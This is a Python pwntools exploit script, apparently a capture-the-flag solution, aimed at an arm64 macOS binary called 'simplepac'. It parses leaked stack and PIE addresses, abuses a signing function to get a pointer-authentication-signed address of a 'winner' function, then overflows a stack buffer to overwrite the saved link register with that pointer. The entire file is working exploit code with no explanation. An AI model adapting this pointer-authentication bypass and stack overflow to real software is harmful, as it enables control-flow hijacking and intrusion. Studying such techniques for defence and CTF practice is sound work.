#!/usr/bin/env python3

from pwn import *
from tqdm import *

# context.log_level = 'debug'
context(arch='arm64', os='darwin')
warnings.filterwarnings('ignore')
import sys

# p = process(argv)
p = process("./simplepac")

s = lambda str: p.send(str)
sl = lambda str: p.sendline(str)
sa = lambda delims, str: p.sendafter(delims, str)
sla = lambda delims, str: p.sendlineafter(delims, str)
r = lambda numb=4096: p.recv(numb)
rl = lambda: p.recvline()
ru = lambda delims: p.recvuntil(delims)
uu32 = lambda data: u32(data.ljust(4, b"\x00"))
uu64 = lambda data: u64(data.ljust(8, b"\x00"))
li = lambda str, data: log.success(str + "========>" + hex(data))
ip = lambda: input()
pi = lambda: p.interactive()

leak = rl()
leak = leak.split(b"SP: ")[1]
sp = int(leak, 16)
info(f"main's sp: {hex(sp)}")

leak = rl()
leak = leak.split(b"pie_base=")[1]
pie_base = int(leak, 16)
info(f"pie_base: {hex(pie_base)}")

winner_addr = p64(pie_base + 0x7fc)
stack_context = p64(sp)

# craft a payload to forge a pointer
forge_payload  = winner_addr
forge_payload += b"\x00" * 24
forge_payload += stack_context

sla(b"------------------------------\n", b"1")
sla(b"unsafe.\n", b"A"*8)
sla(b"name:\n", forge_payload)

# ip()
sla(b"------------------------------\n", b"3")
sl(b"")

sla(b"------------------------------\n", b"2")
ru(b"SIGNED: ")
leak = rl()
leak = int(leak, 16)
info(f"leak: {(hex(leak))}")
pac_as_bytes = p64(leak)


pay  = b"A" * 0xb0     
pay += b"B" * 8         # FP
pay += pac_as_bytes  # LR

sla(b"------------------------------\n", b"1")
sla(b":\n", pay)
sla(b"name:\n", b"C"*8)

sla(b"------------------------------\n", b"4")

pi()